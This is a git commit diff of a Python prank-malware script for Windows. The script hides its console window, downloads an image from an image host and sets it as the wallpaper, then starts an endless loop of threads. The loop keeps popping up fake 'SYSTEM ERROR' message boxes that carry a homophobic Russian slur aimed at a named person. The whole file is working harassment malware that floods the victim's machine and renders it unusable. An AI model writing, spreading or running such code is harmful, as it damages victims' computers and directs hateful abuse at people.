2391595573d7293e0dd010b4f30442957be27432
imyoudeath666-byte <imyoudeath666@gmail.com>
2026-03-02 01:15:42 +0300

    sipesta.py

--- sipesta.py
+++ sipesta.py
@@ -2,27 +2,21 @@ import ctypes
 import threading
 import time
 import os
-
-word = chr(1089)+chr(1080)+chr(1087)+chr(1077)+chr(1089)+chr(1090)+chr(1072)+chr(1090)+' '+chr(1087)+chr(1080)+chr(1076)+chr(1088)
-running = True
+import urllib.request
 
 hwnd = ctypes.windll.kernel32.GetConsoleWindow()
 if hwnd:
     ctypes.windll.user32.ShowWindow(hwnd, 0)
 
+word = 'сипестат пидор'
+
+img_path = os.path.join(os.environ['TEMP'], 'img.jpg')
+urllib.request.urlretrieve('https://i.ibb.co/TMWd9kH5/photo-2024-03-24-02-44-49.jpg', img_path)
+ctypes.windll.user32.SystemParametersInfoW(20, 0, img_path, 3)
+
 def show():
-    try:
-        ctypes.windll.user32.MessageBoxTimeoutW(0, word, 'ОШИБКА СИСТЕМЫ', 0x10, 0, 0)
-    except:
-        pass
+    ctypes.windll.user32.MessageBoxW(0, word, 'ОШИБКА СИСТЕМЫ', 0x10)
 
-def loop():
-    while running:
-        threading.Thread(target=show).start()
-        time.sleep(0.1)
-
-threading.Thread(target=loop).start()
-try:
-    while 1: time.sleep(1)
-except:
-    running = False
+while 1:
+    threading.Thread(target=show).start()
+    time.sleep(0.1)
